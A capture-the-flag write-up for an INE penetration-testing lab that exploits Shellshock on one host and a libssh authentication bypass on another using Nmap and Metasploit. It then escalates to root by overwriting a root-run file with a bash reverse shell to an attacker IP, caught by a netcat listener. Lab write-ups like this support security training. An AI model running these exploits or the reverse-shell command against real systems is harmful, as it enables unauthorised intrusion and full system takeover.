# Host & Network Penetration Testing: System-Host Based Attacks CTF 2
## Flag 1: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local

We begin with an Nmap scan across all ports, which reveals that only port 80 is open

    nmap -sS -O -p- -T4 target1.ine.local
    nmap -sS -O -p80 -sV -T4 target1.ine.local

A service scan reveals Apache 2.4.6 (Unix) on the target system.

We proceed with a Dirb scan to enumerate possible useful folders. It finds cgi-dbin folder and the home page of the site named browser.cgi.
This suggest we could attempt a Shellshocked vulnerability exploit.

    nmap target1.ine.local --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi"

Nmap reveals that the file browser.cgi is vulnerable to Shellshock.

We proceed with Metasploit:

    search shellshock
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    setg RHOSTS target1.ine.local
    setg TARGETURI /browser.cgi
    setg LHOST 192.164.224.2 
    run

**Note: If something is not working, try selecting another LPORT.**

We obtain a Meterpreter session and start exploring the target server, finding .flag.txt as our second flag.
Navigating to the root directory, we locate the first flag.

## Flag 2: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

This flag is found during the previous step.


## Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

Analyzing target 2, we scan it with Nmap. The scan leads us to port 22 and its service, libssh 0.8.3.

    nmap target2.ine.local -p- -T4 -sS
    nmap target2.ine.local -p22 -T4 -sS -sV

Using:
    searchsploit libssh

we discover that this particular version of libssh is vulnerable to unauthorized access.

We proceed with Metasploit:
search libssh
use auxiliary/scanner/ssh/libssh_auth_bypass - action: shell
setg RHOSTS target2.ine.local
set CMD /bin/bash -i
run
sessions -i 1

Navigating to the home folder of the user, we locate the third flag.


## Flag 4: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

Obtaining a root shell is not an easy task. However, there is an executable file in the userâ€™s home folder named welcome, which the user is able to execute. This file runs another file, greetings, that is not accessible.

We overwrite greetings with a file containing the following string:
 
bash -i >& /dev/tcp/192.164.224.2/41234 0>&1

After using Netcat to open port on the attack machine to listen for communications:

nc -nlvp 41234

We execute welcome, that executes greetings, obtaining a root shell on the target machine.

Navigating to the root folder we find the last flag.
